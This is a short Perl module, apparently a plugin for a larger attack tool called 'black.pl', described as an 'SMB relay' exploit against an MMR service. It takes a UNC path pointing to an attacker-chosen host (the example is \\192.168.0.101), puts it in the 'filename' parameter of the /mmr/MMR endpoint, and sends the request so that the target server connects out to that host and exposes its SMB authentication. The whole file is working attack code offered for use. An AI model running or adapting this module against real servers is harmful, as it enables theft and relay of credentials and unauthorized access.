#!/usr/bin/perl
# Module SMB relay MMR service

# CONFIG
######################
my $desc ="MMR service (/mmr/MMR) SMB relay \n\t Usage: black.pl .. .. -m id_module <path> \n\t UNC path like this: \\\\192.168.0.101\n"; 
our $funcName="mmr_smbrelay_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub mmr_smbrelay_Func()
{
	
	if ($ARGV[$m_arg_i+1]){
		$path=$ARGV[$m_arg_i+1];
		print $path." - path \n\n";
	} else {
		print "Error. Please, enter path name\n";
		exit;
	}
	$path="/mmr/MMR?filename=".$path;
	
	my @answers=send_soap($XML,1,$path, "GET");

	my $answer=join('', @answers);

	print "$answer\r\n";
	
	print "\n\n";

}